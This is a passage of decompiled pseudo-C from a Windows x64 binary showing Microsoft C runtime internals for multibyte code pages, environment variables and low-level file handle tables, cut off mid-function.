__int64 __fastcall setmbcp_internal(
        UINT a1,
        char a2,
        struct __acrt_ptd *const a3,
        struct __crt_multibyte_data **const a4)
{
  unsigned int SystemCP; // edi
  _DWORD *v8; // rbx
  _OWORD *v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // r8
  _OWORD *v12; // rax
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  __int128 v18; // xmm0
  __int128 v19; // xmm1
  __int128 v20; // xmm0
  __int128 v21; // xmm1
  __int64 v22; // rax
  _OWORD *v23; // rcx
  _OWORD *v24; // rax
  __int128 v25; // xmm1
  __int128 v26; // xmm0
  __int128 v27; // xmm1
  __int128 v28; // xmm0
  __int128 v29; // xmm1
  __int128 v30; // xmm0
  __int128 v31; // xmm1
  __int128 v32; // xmm0
  __int128 v33; // xmm1
  __int64 v34; // rax
  unsigned int v35; // esi
  void *v36; // rcx
  int v37; // [rsp+28h] [rbp-E0h] BYREF
  int v38; // [rsp+2Ch] [rbp-DCh] BYREF
  __int64 v39; // [rsp+30h] [rbp-D8h] BYREF
  volatile signed __int32 ***v40[2]; // [rsp+38h] [rbp-D0h] BYREF
  _BYTE v41[560]; // [rsp+48h] [rbp-C0h] BYREF
  struct __acrt_ptd *v42; // [rsp+2A8h] [rbp+1A0h] BYREF
  void **v43; // [rsp+2B0h] [rbp+1A8h] BYREF

  v43 = (void **)a4;
  v42 = a3;
  update_thread_multibyte_data_internal(a3, a4);
  SystemCP = getSystemCP(a1);
  if ( SystemCP == *(_DWORD *)(*((_QWORD *)v42 + 17) + 4LL) )
    return 0;
  v8 = malloc_base(0x228u);
  if ( v8 != nullptr )
  {
    v9 = v41;
    v10 = 4;
    v11 = 4;
    v12 = *((_OWORD **)v42 + 17);
    do
    {
      v13 = v12[1];
      *v9 = *v12;
      v14 = v12[2];
      v9[1] = v13;
      v15 = v12[3];
      v9[2] = v14;
      v16 = v12[4];
      v9[3] = v15;
      v17 = v12[5];
      v9[4] = v16;
      v18 = v12[6];
      v9[5] = v17;
      v19 = v12[7];
      v12 += 8;
      v9[6] = v18;
      v9 += 8;
      *(v9 - 1) = v19;
      --v11;
    }
    while ( v11 != 0 );
    v20 = *v12;
    v21 = v12[1];
    v22 = *((_QWORD *)v12 + 4);
    *v9 = v20;
    v9[1] = v21;
    *((_QWORD *)v9 + 4) = v22;
    v23 = v8;
    v24 = v41;
    do
    {
      v25 = v24[1];
      *v23 = *v24;
      v26 = v24[2];
      v23[1] = v25;
      v27 = v24[3];
      v23[2] = v26;
      v28 = v24[4];
      v23[3] = v27;
      v29 = v24[5];
      v23[4] = v28;
      v30 = v24[6];
      v23[5] = v29;
      v31 = v24[7];
      v24 += 8;
      v23[6] = v30;
      v23 += 8;
      *(v23 - 1) = v31;
      --v10;
    }
    while ( v10 != 0 );
    v32 = *v24;
    v33 = v24[1];
    v34 = *((_QWORD *)v24 + 4);
    *v23 = v32;
    v23[1] = v33;
    *((_QWORD *)v23 + 4) = v34;
    *v8 = 0;
    v35 = sub_140024204(SystemCP, v8, 0, 128);
    if ( v35 == -1 )
    {
      *(_DWORD *)sub_140018888() = 22;
      free_base(v8);
      return 0xFFFFFFFFLL;
    }
    else
    {
      if ( a2 == 0 )
        _acrt_set_locale_changed();
      if ( _InterlockedExchangeAdd(*((volatile signed __int32 **)v42 + 17), 0xFFFFFFFF) == 1 )
      {
        v36 = *((void **)v42 + 17);
        if ( v36 != &unk_14009EFC0 )
          free_base(v36);
      }
      *v8 = 1;
      *((_QWORD *)v42 + 17) = v8;
      if ( (*((_DWORD *)v42 + 234) & dword_14009EE10) == 0 )
      {
        v40[0] = (volatile signed __int32 ***)&v42;
        v40[1] = (volatile signed __int32 ***)&v43;
        v38 = 5;
        LODWORD(v39) = 5;
        __crt_seh_guarded_call<void>::operator()<_lambda_efdfa57d1f175319df784efa44bb7b81_,_lambda_5f0a4c1567f8adc6734073e5d1e1b35c_ &,_lambda_2e8a7d3640ea6ccb4c2413664c2db6fd_>(
          (__int64)&v37,
          (int *)&v39,
          v40,
          &v38);
        if ( a2 != 0 )
          off_14009ECB0 = *v43;
      }
      free_base(nullptr);
      return v35;
    }
  }
  else
  {
    free_base(nullptr);
    return 0xFFFFFFFFLL;
  }
}


// ----- ?update_thread_multibyte_data_internal@@YAPEAU__crt_multibyte_data@@QEAU__acrt_ptd@@QEAPEAU1@@Z @ 0x1400240d0 -----
struct __crt_multibyte_data *__fastcall update_thread_multibyte_data_internal(
        struct __acrt_ptd *const a1,
        struct __crt_multibyte_data **const a2)
{
  volatile signed __int32 *v4; // rbx
  volatile signed __int32 *v5; // rax

  if ( (dword_14009EE10 & *((_DWORD *)a1 + 234)) != 0 && *((_QWORD *)a1 + 18) != 0 )
  {
    v4 = *((volatile signed __int32 **)a1 + 17);
  }
  else
  {
    _vcrt_lock(5);
    v4 = *((volatile signed __int32 **)a1 + 17);
    if ( v4 != (volatile signed __int32 *)*a2 )
    {
      if ( v4 != nullptr
        && _InterlockedExchangeAdd(v4, 0xFFFFFFFF) == 1
        && v4 != (volatile signed __int32 *)&unk_14009EFC0 )
      {
        free_base((void *)v4);
      }
      v5 = (volatile signed __int32 *)*a2;
      *((_QWORD *)a1 + 17) = *a2;
      _InterlockedIncrement(v5);
      v4 = v5;
    }
    _vcrt_unlock(5);
  }
  if ( v4 == nullptr )
    abort();
  return (struct __crt_multibyte_data *)v4;
}


// ----- __acrt_initialize_multibyte @ 0x140024188 -----
char _acrt_initialize_multibyte()
{
  struct __acrt_ptd *v0; // rax

  if ( byte_1400A0BCC == 0 )
  {
    qword_1400A0BB8 = &unk_14009F300;
    qword_1400A0BC0 = (struct __crt_multibyte_data *)&unk_14009EFC0;
    qword_1400A0BB0 = &unk_14009F1F0;
    v0 = (struct __acrt_ptd *)sub_14001C7F4();
    setmbcp_internal(0xFFFFFFFD, 1, v0, &qword_1400A0BC0);
    byte_1400A0BCC = 1;
  }
  return 1;
}


// ----- __acrt_update_thread_multibyte_data @ 0x1400241e8 -----
struct __crt_multibyte_data *_acrt_update_thread_multibyte_data()
{
  struct __acrt_ptd *v0; // rax

  v0 = (struct __acrt_ptd *)sub_14001C7D8();
  return update_thread_multibyte_data_internal(v0, &qword_1400A0BC0);
}


// ----- sub_140024204 @ 0x140024204 -----
__int64 __fastcall sub_140024204(UINT a1, __int64 a2)
{
  const wchar_t *v3; // rbx
  UINT SystemCP; // edi
  unsigned int v5; // r14d
  _DWORD *v6; // rax
  int v7; // ebp
  _WORD *v8; // rdi
  __int64 m; // rcx
  bool v10; // zf
  BYTE *j; // rcx
  unsigned int v12; // eax
  unsigned int v13; // edx
  __int64 v14; // rdi
  __int64 v15; // rdx
  _BYTE *v16; // rax
  __int64 k; // rcx
  const wchar_t *v18; // rax
  __int64 v20; // rax
  _BYTE *v21; // r15
  __int64 v22; // r14
  char *v23; // r9
  unsigned __int8 *v24; // rdx
  unsigned int v25; // r8d
  __int64 v26; // r10
  UINT v27; // edi
  UINT v28; // edi
  UINT v29; // edi
  _WORD *v30; // rdx
  __int64 i; // rcx
  struct _cpinfo CPInfo; // [rsp+20h] [rbp-48h] BYREF

  memset(&CPInfo, 0, sizeof(CPInfo));
  v3 = nullptr;
  SystemCP = getSystemCP(a1);
  if ( SystemCP == 0 )
  {
LABEL_57:
    setSBCS((struct __crt_multibyte_data *)a2);
    return 0;
  }
  v5 = 0;
  v6 = &unk_14009F410;
  v7 = 1;
  do
  {
    if ( *v6 == SystemCP )
    {
      memset((void *)(a2 + 24), 0, 0x101u);
      v20 = v5;
      v21 = &unk_14009F400;
      v22 = 4;
      v23 = (char *)&unk_14009F420 + 48 * v20;
      do
      {
        v24 = (unsigned __int8 *)v23;
        if ( *v23 != 0 )
        {
          do
          {
            if ( v24[1] == 0 )
              break;
            v25 = *v24;
            if ( v25 <= v24[1] )
            {
              v26 = v25 + 1;
              do
              {
                if ( (unsigned int)v26 >= 0x101 )
                  break;
                ++v25;
                *(_BYTE *)(v26 + a2 + 24) |= *v21;
                v26 = (unsigned int)(v26 + 1);
              }
              while ( v25 <= v24[1] );
            }
            v24 += 2;
          }
          while ( *v24 != 0 );
        }
        v23 += 8;
        ++v21;
        --v22;
      }
      while ( v22 != 0 );
      *(_DWORD *)(a2 + 4) = SystemCP;
      *(_DWORD *)(a2 + 8) = 1;
      v27 = SystemCP - 932;
      if ( v27 != 0 )
      {
        v28 = v27 - 4;
        if ( v28 != 0 )
        {
          v29 = v28 - 13;
          if ( v29 != 0 )
          {
            if ( v29 == 1 )
              v3 = L"zh-TW";
          }
          else
          {
            v3 = L"ko-KR";
          }
        }
        else
        {
          v3 = L"zh-CN";
        }
      }
      else
      {
        v3 = L"ja-JP";
      }
      *(_QWORD *)(a2 + 544) = v3;
      v30 = (_WORD *)(a2 + 12);
      for ( i = 6; i != 0; --i )
      {
        *v30 = *(_WORD *)((char *)v30 + (_QWORD)&unk_14009F410 + 48 * v20 - a2 - 8);
        ++v30;
      }
      goto LABEL_56;
    }
    ++v5;
    v6 += 12;
  }
  while ( v5 < 5 );
  if ( SystemCP == 65000 || !IsValidCodePage((unsigned __int16)SystemCP) )
    return 0xFFFFFFFFLL;
  if ( SystemCP == 65001 )
  {
    *(_QWORD *)(a2 + 4) = 65001;
    *(_QWORD *)(a2 + 544) = 0;
    *(_DWORD *)(a2 + 24) = 0;
    *(_WORD *)(a2 + 28) = 0;
    goto LABEL_9;
  }
  if ( !GetCPInfo(SystemCP, &CPInfo) )
  {
    if ( dword_1400A0BC8 != 0 )
      goto LABEL_57;
    return 0xFFFFFFFFLL;
  }
  memset((void *)(a2 + 24), 0, 0x101u);
  v10 = CPInfo.MaxCharSize == 2;
  *(_DWORD *)(a2 + 4) = SystemCP;
  *(_QWORD *)(a2 + 544) = 0;
  if ( v10 )
  {
    for ( j = CPInfo.LeadByte; *j != 0; j += 2 )
    {
      if ( j[1] == 0 )
        break;
      v12 = j[1];
      v13 = *j;
      if ( v13 <= v12 )
      {
        v14 = v13 + 1;
        v15 = v12 - v13 + 1;
        do
        {
          *(_BYTE *)(v14 + a2 + 24) |= 4u;
          v14 = (unsigned int)(v14 + 1);
          --v15;
        }
        while ( v15 != 0 );
      }
    }
    v16 = (_BYTE *)(a2 + 26);
    for ( k = 254; k != 0; --k )
      *v16++ |= 8u;
    switch ( *(_DWORD *)(a2 + 4) )
    {
      case 0x3A4:
        v18 = L"ja-JP";
        break;
      case 0x3A8:
        v18 = L"zh-CN";
        break;
      case 0x3B5:
        v18 = L"ko-KR";
        break;
      case 0x3B6:
        v18 = L"zh-TW";
        break;
      default:
        v18 = nullptr;
        break;
    }
    *(_QWORD *)(a2 + 544) = v18;
  }
  else
  {
    v7 = 0;
  }
  *(_DWORD *)(a2 + 8) = v7;
LABEL_9:
  v8 = (_WORD *)(a2 + 12);
  for ( m = 6; m != 0; --m )
    *v8++ = 0;
LABEL_56:
  setSBUpLow((struct __crt_multibyte_data *)a2);
  return 0;
}


// ----- ?x_ismbbtype_l@@YAHPEAU__crt_locale_pointers@@IHH@Z @ 0x1400244cc -----
_BOOL8 __fastcall x_ismbbtype_l(struct __crt_locale_pointers *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)
{
  _BOOL8 result; // rax
  _QWORD v8[3]; // [rsp+20h] [rbp-28h] BYREF
  char v9; // [rsp+38h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v8, a1);
  result = (a4 & *(_BYTE *)(a2 + v8[2] + 25LL)) != 0
        || a3 != 0 && (*(_WORD *)(*(_QWORD *)v8[1] + 2LL * a2) & (unsigned __int16)a3) != 0;
  if ( v9 != 0 )
    *(_DWORD *)(v8[0] + 936LL) &= ~2u;
  return result;
}


// ----- _ismbblead @ 0x140024540 -----
int __cdecl ismbblead(unsigned int Ch)
{
  return x_ismbbtype_l(nullptr, Ch, 0, 4u);
}


// ----- __dcrt_get_narrow_environment_from_os @ 0x140024554 -----
CHAR *_dcrt_get_narrow_environment_from_os()
{
  LPWCH EnvironmentStringsW; // rax
  CHAR *v1; // rsi
  WCHAR *v2; // rbx
  char *v4; // rbp
  __int64 v5; // rax
  __int64 v6; // rbp
  int v7; // r14d
  CHAR *v8; // rax
  CHAR *v9; // rdi

  EnvironmentStringsW = GetEnvironmentStringsW();
  v1 = nullptr;
  v2 = EnvironmentStringsW;
  if ( EnvironmentStringsW == nullptr )
    return nullptr;
  v4 = (char *)EnvironmentStringsW;
  if ( *EnvironmentStringsW != 0 )
  {
    do
    {
      v5 = -1;
      do
        ++v5;
      while ( *(_WORD *)&v4[2 * v5] != 0 );
      v4 += 2 * v5 + 2;
    }
    while ( *(_WORD *)v4 != 0 );
  }
  v6 = (v4 - (char *)v2 + 2) >> 1;
  v7 = _acrt_WideCharToMultiByte(0, 0, v2, v6, nullptr, 0, nullptr, nullptr);
  if ( v7 == 0 )
  {
LABEL_8:
    FreeEnvironmentStringsW(v2);
    return nullptr;
  }
  v8 = (CHAR *)malloc_base(v7);
  v9 = v8;
  if ( v8 == nullptr )
  {
    free_base(nullptr);
    goto LABEL_8;
  }
  if ( _acrt_WideCharToMultiByte(0, 0, v2, v6, v8, v7, nullptr, nullptr) != 0 )
  {
    free_base(nullptr);
    v1 = v9;
  }
  else
  {
    free_base(v9);
  }
  FreeEnvironmentStringsW(v2);
  return v1;
}


// ----- ??$common_set_variable_in_environment_nolock@D@@YAHQEADH@Z @ 0x140024664 -----
__int64 __fastcall common_set_variable_in_environment_nolock<char>(_BYTE *Block, int a2)
{
  unsigned int v2; // esi
  void *v5; // rdi
  _BYTE *v6; // rax
  _BYTE *v7; // r13
  __int64 *v8; // r14
  char v9; // bp
  unsigned int v10; // ebp
  __int64 v12; // rax
  __int64 v13; // r12
  __int64 *i; // rbx
  signed __int64 v15; // rbx
  void *v16; // rbx
  unsigned __int64 v17; // rbx
  size_t v18; // rdx
  _QWORD *v19; // r14
  __int64 v20; // r14
  _BYTE *v21; // rax
  _BYTE *v22; // rbx

  v2 = 0;
  if ( Block != nullptr )
  {
    v5 = Block;
    v6 = (_BYTE *)sub_14002A8BC(Block, 61);
    v7 = v6;
    if ( v6 == nullptr || v6 == Block )
    {
      *(_DWORD *)sub_140018888() = 22;
      free_base(Block);
      return -1;
    }
    v8 = (__int64 *)qword_1400A04F8;
    v9 = v6[1];
    if ( qword_1400A04F8 == qword_1400A0510 )
    {
      v8 = (__int64 *)copy_environment<char>(qword_1400A04F8);
      qword_1400A04F8 = v8;
    }
    if ( v8 == nullptr )
    {
      if ( a2 != 0 && qword_1400A0500 != 0 )
      {
        if ( unknown_libname_82() == nullptr )
        {
          *(_DWORD *)sub_140018888() = 22;
LABEL_12:
          v10 = -1;
LABEL_13:
          free_base(Block);
          return v10;
        }
        v8 = (__int64 *)qword_1400A04F8;
        if ( qword_1400A04F8 == qword_1400A0510 )
        {
          v8 = (__int64 *)copy_environment<char>(qword_1400A04F8);
          qword_1400A04F8 = v8;
        }
      }
      else
      {
        if ( v9 == 0 )
          goto LABEL_39;
        qword_1400A04F8 = calloc_base(1u, 8u);
        free_base(nullptr);
        v8 = (__int64 *)qword_1400A04F8;
        if ( qword_1400A04F8 == nullptr )
          goto LABEL_12;
        if ( qword_1400A0500 == 0 )
        {
          qword_1400A0500 = (__int64)calloc_base(1u, 8u);
          free_base(nullptr);
          if ( qword_1400A0500 == 0 )
            goto LABEL_12;
          v8 = (__int64 *)qword_1400A04F8;
        }
      }
      if ( v8 == nullptr )
        goto LABEL_12;
    }
    v12 = *v8;
    v13 = v7 - Block;
    for ( i = v8; ; v12 = *i )
    {
      if ( v12 == 0 )
      {
        v15 = -(i - v8);
        goto LABEL_29;
      }
      if ( (unsigned int)sub_1400298E0(Block, v12, v7 - Block) == 0
        && (*(_BYTE *)(v13 + *i) == 61 || *(_BYTE *)(v13 + *i) == 0) )
      {
        break;
      }
      ++i;
    }
    v15 = i - v8;
LABEL_29:
    if ( v15 >= 0 && *v8 != 0 )
    {
      free_base((void *)v8[v15]);
      if ( v9 == 0 )
      {
        while ( v8[v15] != 0 )
        {
          v8[v15] = v8[v15 + 1];
          ++v15;
        }
        v16 = recalloc_base(v8, v15, 8u);
        free_base(nullptr);
        if ( v16 != nullptr )
          qword_1400A04F8 = v16;
LABEL_45:
        if ( a2 != 0 )
        {
          v20 = -1;
          do
            ++v20;
          while ( Block[v20] != 0 );
          v21 = calloc_base(v20 + 2, 1u);
          v22 = v21;
          if ( v21 == nullptr )
          {
            free_base(nullptr);
LABEL_53:
            free_base(v5);
            return v2;
          }
          if ( (unsigned int)sub_14001BA50(v21, v20 + 2, (__int64)Block) != 0 )
            invoke_watson(nullptr, nullptr, nullptr, 0, 0);
          v7[v22 - Block] = 0;
          if ( (unsigned int)_acrt_SetEnvironmentVariableA(
                               v22,
                               (unsigned __int64)&v7[v22 - Block + 1] & -(__int64)(v9 != 0)) == 0 )
          {
            *(_DWORD *)sub_140018888() = 42;
            free_base(v22);
            v2 = -1;
            goto LABEL_53;
          }
          free_base(v22);
        }
        free_base(v5);
        return 0;
      }
      v8[v15] = (__int64)Block;
LABEL_44:
      v5 = nullptr;
      goto LABEL_45;
    }
    if ( v9 != 0 )
    {
      v17 = -v15;
      v18 = v17 + 2;
      if ( v17 + 2 < v17 )
        goto LABEL_12;
      if ( v18 >= 0x1FFFFFFFFFFFFFFFLL )
        goto LABEL_12;
      v19 = recalloc_base(v8, v18, 8u);
      free_base(nullptr);
      if ( v19 == nullptr )
        goto LABEL_12;
      v19[v17] = Block;
      v19[v17 + 1] = 0;
      qword_1400A04F8 = v19;
      goto LABEL_44;
    }
LABEL_39:
    v10 = 0;
    goto LABEL_13;
  }
  *(_DWORD *)sub_140018888() = 22;
  return -1;
}


// ----- ??$copy_environment@D@@YAPEAPEADQEAPEAD@Z @ 0x1400249bc -----
_BYTE *__fastcall copy_environment<char>(__int64 *a1)
{
  __int64 *v1; // rdi
  __int64 v3; // rcx
  __int64 *i; // rax
  _BYTE *v5; // rbx
  __int64 v6; // rax
  signed __int64 v7; // r14
  __int64 v8; // rsi
  _BYTE *v9; // rcx

  v1 = a1;
  if ( a1 == nullptr )
    return nullptr;
  v3 = 0;
  for ( i = v1; *i != 0; ++i )
    ++v3;
  v5 = calloc_base(v3 + 1, 8u);
  if ( v5 == nullptr )
LABEL_15:
    abort();
  v6 = *v1;
  if ( *v1 != 0 )
  {
    v7 = v5 - (_BYTE *)v1;
    do
    {
      v8 = -1;
      do
        ++v8;
      while ( *(_BYTE *)(v6 + v8) != 0 );
      *(__int64 *)((char *)v1 + v7) = (__int64)calloc_base(v8 + 1, 1u);
      free_base(nullptr);
      v9 = *(_BYTE **)((char *)v1 + v7);
      if ( v9 == nullptr )
        goto LABEL_15;
      if ( (unsigned int)sub_14001BA50(v9, v8 + 1, *v1) != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      v6 = *++v1;
    }
    while ( *v1 != 0 );
  }
  free_base(nullptr);
  return v5;
}


// ----- j_??$common_set_variable_in_environment_nolock@D@@YAHQEADH@Z @ 0x140024aa4 -----
// attributes: thunk
__int64 __fastcall common_set_variable_in_environment_nolock<char>(_BYTE *Block, int a2)
{
  return ??$common_set_variable_in_environment_nolock@D@@YAHQEADH@Z(Block, a2);
}


// ----- __acrt_app_verifier_enabled @ 0x140024aac -----
char _acrt_app_verifier_enabled()
{
  return BYTE1(NtCurrentTeb()->ProcessEnvironmentBlock->NtGlobalFlag) & 1;
}


// ----- __acrt_is_secure_process @ 0x140024ac8 -----
__int64 _acrt_is_secure_process()
{
  return NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Flags >> 31;
}


// ----- __acrt_get_process_end_policy @ 0x140024ae0 -----
__int64 _acrt_get_process_end_policy()
{
  unsigned int v0; // ebx
  int v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = 0;
  v2 = 0;
  if ( (unsigned __int8)_acrt_is_secure_process() == 0 )
    sub_14001D194((__int64)&v2);
  LOBYTE(v0) = v2 != 1;
  return v0;
}


// ----- __acrt_lowio_create_handle_array @ 0x140024b10 -----
char *_acrt_lowio_create_handle_array()
{
  char *v0; // rax
  char *v1; // rsi
  char *v2; // rbx
  char *v3; // rbp
  char *v4; // rdi
  _BYTE *v5; // rcx
  unsigned int v6; // eax

  v0 = (char *)calloc_base(0x40u, 0x48u);
  v1 = nullptr;
  v2 = v0;
  if ( v0 != nullptr )
  {
    v3 = v0 + 4608;
    v4 = v0 + 48;
    do
    {
      InitializeCriticalSectionEx((LPCRITICAL_SECTION)(v4 - 48), 0xFA0u, 0);
      *((_QWORD *)v4 - 1) = -1;
      v5 = v4 + 14;
      v4[13] &= 0xF8u;
      v6 = 0;
      *(_QWORD *)v4 = 0;
      *((_DWORD *)v4 + 2) = 168427520;
      v4[12] = 10;
      do
      {
        *v5 = 0;
        ++v6;
        ++v5;
      }
      while ( v6 < 5 );
      v4 += 72;
    }
    while ( v4 - 48 != v3 );
    v1 = v2;
  }
  free_base(nullptr);
  return v1;
}


// ----- __acrt_lowio_destroy_handle_array @ 0x140024bb8 -----
void __fastcall _acrt_lowio_destroy_handle_array(char *Block)
{
  struct _RTL_CRITICAL_SECTION *v1; // rsi
  struct _RTL_CRITICAL_SECTION *v3; // rdi

  if ( Block != nullptr )
  {
    v1 = (struct _RTL_CRITICAL_SECTION *)(Block + 4608);
    v3 = (struct _RTL_CRITICAL_SECTION *)Block;
    do
    {
      DeleteCriticalSection(v3);
      v3 = (struct _RTL_CRITICAL_SECTION *)((char *)v3 + 72);
    }
    while ( v3 != v1 );
    free_base(Block);
  }
}


// ----- __acrt_lowio_ensure_fh_exists @ 0x140024c08 -----
__int64 __fastcall _acrt_lowio_ensure_fh_exists(unsigned int a1)
{
  unsigned int v3; // edi
  __int64 v4; // rbx
  int v5; // eax
  char *handle_array; // rax

  if ( a1 < 0x2000 )
  {
    v3 = 0;
    _vcrt_lock(7);
    v4 = 0;
    v5 = dword_1400A0A80;
    while ( (int)a1 >= v5 )
    {
      if ( qword_1400A0680[v4] == 0 )
      {
        handle_array = _acrt_lowio_create_handle_array();
        qword_1400A0680[v4] = (__int64)handle_array;
        if ( handle_array == nullptr )
        {
          v3 = 12;
          break;
        }
        v5 = dword_1400A0A80 + 64;
        dword_1400A0A80 += 64;
      }
      ++v4;
    }
    _vcrt_unlock(7);
    return v3;
  }
  else
  {
    *(_DWORD *)sub_140018888() = 9;
    invalid_parameter_noinfo();
    return 9;
  }
}


// ----- __acrt_lowio_lock_fh @ 0x140024cb0 -----
void __fastcall _acrt_lowio_lock_fh(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(qword_1400A0680[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));
}


// ----- __acrt_lowio_set_os_handle @ 0x140024cd8 -----
__int64 __fastcall _acrt_lowio_set_os_handle(int a1, void *a2)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // rbp
  int v6; // ebx
  DWORD v7; // ecx

  if ( a1 >= 0 && a1 < (unsigned int)dword_1400A0A80 )
  {
    v4 = (unsigned __int64)a1 >> 6;
    v5 = 9LL * (a1 & 0x3F);
    if ( *(_QWORD *)(qword_1400A0680[v4] + 72LL * (a1 & 0x3F) + 40) == -1 )
    {
      if ( (unsigned int)sub_140018DC0() == 1 )
      {
        if ( a1 == 0 )
        {
          v7 = -10;
          goto LABEL_11;
        }
        v6 = a1 - 1;
        if ( v6 == 0 )
        {
          v7 = -11;
          goto LABEL_11;
        }
        if ( v6 == 1 )
        {
          v7 = -12;
LABEL_11:
          SetStdHandle(v7, a2);
        }
      }
      *(_QWORD *)(qword_1400A0680[v4] + 8 * v5 + 40) = a2;
      return 0;
    }
  }
  *(_DWORD *)sub_140018888() = 9;
  *(_DWORD *)sub_140018864() = 0;
  return 0xFFFFFFFFLL;
}


// ----- __acrt_lowio_unlock_fh @ 0x140024d98 -----
void __fastcall _acrt_lowio_unlock_fh(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_1400A0680[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));
}


// ----- _alloc_osfhnd @ 0x140024dc0 -----
__int64 alloc_osfhnd()
{
  unsigned int v0; // r14d
  int i; // ebx
  __int64 v2; // rsi
  char *handle_array; // rax
  int v4; // ebx
  __int64 j; // rdi
  signed int v6; // edx
  __int64 v7; // r8
  __int64 v8; // rcx

  _vcrt_lock(7);
  v0 = -1;
  for ( i = 0; i < 128; ++i )
  {
    v2 = qword_1400A0680[i];
    if ( v2 == 0 )
    {
      handle_array = _acrt_lowio_create_handle_array();
      qword_1400A0680[i] = (__int64)handle_array;
      if ( handle_array != nullptr )
      {
        dword_1400A0A80 += 64;
        v4 = i << 6;
        _acrt_lowio_lock_fh(v4);
        *(_BYTE *)(qword_1400A0680[(__int64)v4 >> 6] + 56) = 1;
        v0 = v4;
      }
      break;
    }
    for ( j = qword_1400A0680[i]; j != v2 + 4608; j += 72 )
    {
      if ( (*(_BYTE *)(j + 56) & 1) == 0 )
      {
        EnterCriticalSection((LPCRITICAL_SECTION)j);
        if ( (*(_BYTE *)(j + 56) & 1) == 0 )
        {
          v6 = (i << 6) + (j - v2) / 72;
          v7 = (__int64)v6 >> 6;
          v8 = 9LL * (v6 & 0x3F);
          *(_BYTE *)(qword_1400A0680[v7] + 8 * v8 + 56) = 1;
          *(_QWORD *)(qword_1400A0680[v7] + 8 * v8 + 40) = -1;
          v0 = v6;
          goto LABEL_14;
        }
        LeaveCriticalSection((LPCRITICAL_SECTION)j);
      }
    }
  }
LABEL_14:
  _vcrt_unlock(7);
  return v0;
}


// ----- _free_osfhnd @ 0x140024f00 -----
__int64 __fastcall free_osfhnd(int a1)
{
  unsigned __int64 v2; // rsi
  __int64 v3; // rdi
  __int64 v4; // rax
  int v5; // ebx
  DWORD v6; // ecx

  if ( a1 >= 0 && a1 < (unsigned int)dword_1400A0A80 )
  {
    v2 = (unsigned __int64)a1 >> 6;
    v3 = 9LL * (a1 & 0x3F);
    v4 = qword_1400A0680[v2];
    if ( (*(_BYTE *)(v4 + 72LL * (a1 & 0x3F) + 56) & 1) != 0 && *(_QWORD *)(v4 + 72LL * (a1 & 0x3F) + 40) != -1 )
    {
      if ( (unsigned int)sub_140018DC0() == 1 )
      {
        if ( a1 == 0 )
        {
          v6 = -10;
          goto LABEL_12;
        }
        v5 = a1 - 1;
        if ( v5 == 0 )
        {
          v6 = -11;
          goto LABEL_12;
        }
        if ( v5 == 1 )
        {
          v6 = -12;
LABEL_12:
          SetStdHandle(v6, nullptr);
        }
      }
      *(_QWORD *)(qword_1400A0680[v2] + 8 * v3 + 40) = -1;
      return 0;
    }
  }
  *(_DWORD *)sub_140018888() = 9;
  *(_DWORD *)sub_140018864() = 0;
  return 0xFFFFFFFFLL;
}


// ----- _get_osfhandle @ 0x140024fbc -----
intptr_t __cdecl get_osfhandle(int FileHandle)
{
  unsigned __int64 v1; // rax
  __int64 v2; // rcx
  __int64 v3; // rax

  if ( FileHandle == -2 )
  {
    *(_DWORD *)sub_140018864() = 0;
    *(_DWORD *)sub_140018888() = 9;
  }
  else
  {
    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_1400A0A80 )
    {
      v1 = FileHandle;
      v2 = FileHandle & 0x3F;
      v3 = qword_1400A0680[v1 >> 6];
      if ( (*(_BYTE *)(v3 + 72 * v2 + 56) & 1) != 0 )
        return *(_QWORD *)(v3 + 72 * v2 + 40);
    }
    *(_DWORD *)sub_140018864() = 0;
    *(_DWORD *)sub_140018888() = 9;
    invalid_parameter_noinfo();
  }
  return -1;
}


// ----- sub_140025034 @ 0x140025034 -----
__int64 sub_140025034()
{
  if ( dword_1400A0BD0 == 0 )
    dword_1400A0BD0 = 0x4000;
  return 0;
}


// ----- __acrt_locale_free_monetary @ 0x14002504c -----
void __fastcall _acrt_locale_free_monetary(_QWORD *a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx
  void *v7; // rcx
  void *v8; // rcx
  void *v9; // rcx
  void *v10; // rcx
  void *v11; // rcx
  void *v12; // rcx
  void *v13; // rcx
  void *v14; // rcx

  if ( a1 != nullptr )
  {
    v2 = (void *)a1[3];
    if ( v2 != off_14009EA98 )
      free_base(v2);
    v3 = (void *)a1[4];
    if ( v3 != off_14009EAA0 )
      free_base(v3);
    v4 = (void *)a1[5];
    if ( v4 != off_14009EAA8 )
      free_base(v4);
    v5 = (void *)a1[6];
    if ( v5 != off_14009EAB0 )
      free_base(v5);
    v6 = (void *)a1[7];
    if ( v6 != off_14009EAB8 )
      free_base(v6);
    v7 = (void *)a1[8];
    if ( v7 != off_14009EAC0 )
      free_base(v7);
    v8 = (void *)a1[9];
    if ( v8 != off_14009EAC8 )
      free_base(v8);
    v9 = (void *)a1[13];
    if ( v9 != off_14009EAE8 )
      free_base(v9);
    v10 = (void *)a1[14];
    if ( v10 != off_14009EAF0 )
      free_base(v10);
    v11 = (void *)a1[15];
    if ( v11 != off_14009EAF8 )
      free_base(v11);
    v12 = (void *)a1[16];
    if ( v12 != off_14009EB00 )
      free_base(v12);
    v13 = (void *)a1[17];
    if ( v13 != off_14009EB08 )
      free_base(v13);
    v14 = (void *)a1[18];
    if ( v14 != off_14009EB10 )
      free_base(v14);
  }
}


// ----- __acrt_locale_initialize_monetary @ 0x140025158 -----
__int64 __fastcall _acrt_locale_initialize_monetary(__int64 a1)
{
  _DWORD *v1; // r15
  _DWORD *v3; // r12
  _OWORD *v4; // rsi
  void **v5; // rbx
  void *v7; // rcx
  const wchar_t *v8; // rdi
  int LocaleInfoA; // ebx
  int v10; // ebx
  int v11; // ebx
